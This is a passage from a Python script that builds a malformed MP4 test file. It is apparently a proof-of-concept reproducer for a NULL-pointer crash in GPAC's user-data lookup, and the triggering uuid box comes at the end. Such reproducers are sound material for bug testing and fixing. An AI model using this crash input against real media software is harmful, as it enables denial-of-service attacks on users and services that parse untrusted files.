10000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\n    mvhd_data += b\'\\x00\' * 24  # pre-defined\n    mvhd_data += struct.pack(\'>I\', 2)  # next_track_ID\n    moov_parts.append(write_fullbox(\'mvhd\', 0, 0, mvhd_data))\n    \n    # 3.2 trak box\n    trak_parts = []\n    \n    # 3.2.1 tkhd box (track header)\n    tkhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1, 0, 1000, 0)  # creation/modification, track_id, reserved, duration, reserved\n    tkhd_data += struct.pack(\'>hh\', 0, 0)  # layer, alternate_group\n    tkhd_data += struct.pack(\'>HH\', 0, 0)  # volume, reserved\n    # Unity matrix\n    tkhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\n    tkhd_data += struct.pack(\'>II\', 320 << 16, 240 << 16)  # width, height\n    trak_parts.append(write_fullbox(\'tkhd\', 0, 0x07, tkhd_data))  # flags=7 (enabled, in_movie, in_preview)\n    \n    # 3.2.2 mdia box\n    mdia_parts = []\n    \n    # mdhd box (media header)\n    mdhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1000, 1000, 0x55c4, 0)  # timescale=1000, duration=1000, language=und\n    mdia_parts.append(write_fullbox(\'mdhd\', 0, 0, mdhd_data))\n    \n    # hdlr box (handler)\n    hdlr_data = struct.pack(\'>I4s\', 0, b\'\\x00\\x00\\x00\\x00\')  # pre_defined\n    hdlr_data += b\'vide\' + b\'\\x00\' * 12  # handler_type=\'vide\', reserved\n    hdlr_data += b\'VideoHandler\\x00\'  # name\n    mdia_parts.append(write_fullbox(\'hdlr\', 0, 0, hdlr_data))\n    \n    # minf box (media information)\n    minf_parts = []\n    \n    # vmhd box (video media header) - FIXED: must have exactly 8 bytes of reserved data\n    vmhd_data = struct.pack(\'>Q\', 0)  # 8 bytes reserved (was only 6 in round2, causing parse error)\n    minf_parts.append(write_fullbox(\'vmhd\', 0, 1, vmhd_data))\n    \n    # dinf box (data information)\n    dref_entries = []\n    url_data = b\'\'  # empty, flags=1 means self-contained\n    dref_entries.append(write_fullbox(\'url \', 0, 1, url_data))\n    dref_data = struct.pack(\'>I\', len(dref_entries)) + b\'\'.join(dref_entries)\n    dinf_data = write_fullbox(\'dref\', 0, 0, dref_data)\n    minf_parts.append(write_box(\'dinf\', dinf_data))\n    \n    # stbl box (sample table)\n    stbl_parts = []\n    \n    # stsd box (sample description)\n    stsd_entries = []\n    # avc1 visual sample entry\n    avc1_data = b\'\\x00\' * 6 + struct.pack(\'>H\', 1)  # reserved[6], data_reference_index\n    avc1_data += b\'\\x00\' * 16  # pre_defined, reserved\n    avc1_data += struct.pack(\'>HH\', 320, 240)  # width, height\n    avc1_data += struct.pack(\'>II\', 0x00480000, 0x00480000)  # horizresolution, vertresolution\n    avc1_data += struct.pack(\'>I\', 0)  # reserved\n    avc1_data += struct.pack(\'>H\', 1)  # frame_count\n    avc1_data += b\'\\x00\' * 32  # compressorname[32]\n    avc1_data += struct.pack(\'>HH\', 0x0018, 0xffff)  # depth, pre_defined\n    # avcC box (AVC decoder configuration)\n    avcc_data = struct.pack(\'>BBBBBB\', 1, 0x42, 0, 0x1e, 0xff, 0xe1)  # configurationVersion, profile, compatibility, level, lengthSizeMinusOne, numOfSPS\n    sps = b\'\\x67\\x42\\x00\\x1e\\x8c\\x8d\\x40\'\n    avcc_data += struct.pack(\'>H\', len(sps)) + sps\n    avcc_data += struct.pack(\'>B\', 1)  # numOfPPS\n    pps = b\'\\x68\\xce\\x3c\\x80\'\n    avcc_data += struct.pack(\'>H\', len(pps)) + pps\n    avc1_data += write_box(\'avcC\', avcc_data)\n    stsd_entries.append(write_box(\'avc1\', avc1_data))\n    stsd_data = struct.pack(\'>I\', len(stsd_entries)) + b\'\'.join(stsd_entries)\n    stbl_parts.append(write_fullbox(\'stsd\', 0, 0, stsd_data))\n    \n    # stts box (time-to-sample)\n    stts_data = struct.pack(\'>I\', 1)  # entry_count\n    stts_data += struct.pack(\'>II\', 1, 1000)  # sample_count, sample_delta\n    stbl_parts.append(write_fullbox(\'stts\', 0, 0, stts_data))\n    \n    # stsc box (sample-to-chunk)\n    stsc_data = struct.pack(\'>I\', 1)  # entry_count\n    stsc_data += struct.pack(\'>III\', 1, 1, 1)  # first_chunk, samples_per_chunk, sample_description_index\n    stbl_parts.append(write_fullbox(\'stsc\', 0, 0, stsc_data))\n    \n    # stsz box (sample size)\n    stsz_data = struct.pack(\'>II\', 0, 1)  # sample_size=0 (variable), sample_count=1\n    stsz_data += struct.pack(\'>I\', 32)  # entry_size[0]\n    stbl_parts.append(write_fullbox(\'stsz\', 0, 0, stsz_data))\n    \n    # stco box (chunk offset)\n    stco_data = struct.pack(\'>I\', 1)  # entry_count\n    stco_data += struct.pack(\'>I\', 40)  # chunk_offset[0] (approximate offset of mdat data)\n    stbl_parts.append(write_fullbox(\'stco\', 0, 0, stco_data))\n    \n    minf_parts.append(write_box(\'stbl\', b\'\'.join(stbl_parts)))\n    mdia_parts.append(write_box(\'minf\', b\'\'.join(minf_parts)))\n    trak_parts.append(write_box(\'mdia\', b\'\'.join(mdia_parts)))\n    \n    # 3.2.3 udta box (user data) - THE TRIGGER!\n    # This contains a UUID box that will cause the crash when gf_isom_get_user_data()\n    # is called with UUID=NULL to search for \'GSRD\' (4CC) userdata.\n    udta_parts = []\n    \n    # uuid box - the vulnerable code will try to memcmp(map->uuid, NULL, 16) when it sees this\n    uuid_value = b\'\\x12\\x34\\x56\\x78\' * 4  # 16-byte UUID\n    uuid_payload = b\'trigger_crash_data\'\n    uuid_box = struct.pack(\'>I4s\', 8 + 16 + len(uuid_payload), b\'uuid\') + uuid_value + uuid_payload\n    udta_parts.append(uuid_box)\n    \n    trak_parts.append(write_box(\'udta\', b\'\'.join(udta_parts)))\n    \n    moov_parts.append(write_box(\'trak\', b\'\'.join(trak_parts)))\n    \n    # Write moov box\n    f.write(write_box(\'moov\', b\'\'.join(moov_parts)))\n\nprint(f"Generated testcase: {output_path}")\nprint(f"File size: {open(output_path, \'rb\').seek(0, 2)} bytes")\n'}
